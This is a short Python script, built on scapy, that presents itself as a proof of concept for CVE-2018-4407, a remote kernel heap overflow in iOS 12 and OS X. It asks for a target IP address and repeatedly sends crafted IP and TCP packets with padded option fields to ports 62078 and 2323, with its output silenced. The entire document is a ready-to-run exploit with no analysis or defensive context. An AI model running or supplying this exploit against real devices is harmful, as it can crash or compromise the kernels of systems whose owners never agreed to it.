#!/usr/bin/env python3
from scapy.all import *
from contextlib import contextmanager, redirect_stdout

@contextmanager
def suppress_stdout():
    with open(os.devnull, "w") as devnull:
        with redirect_stdout(devnull):
            yield
print("[CVE-2018-4407]: Remote Kernel Heap Overflow")
ip = input("Enter iOS 12 / OS X IP address: ") or 0
if(ip!=0):
    print("[*] Sending crafted payload to "+ ip)
    for i in range(8,40):
        with suppress_stdout():
            send(IP(dst=ip,options=[IPOption("A"*i)])/TCP(dport=62078,options=[(19, "1"*18),(19, "2"*18)]))
            send(IP(dst=ip,options=[IPOption("A"*i)])/TCP(dport=2323,options=[(19, "1"*18),(19, "2"*18)]))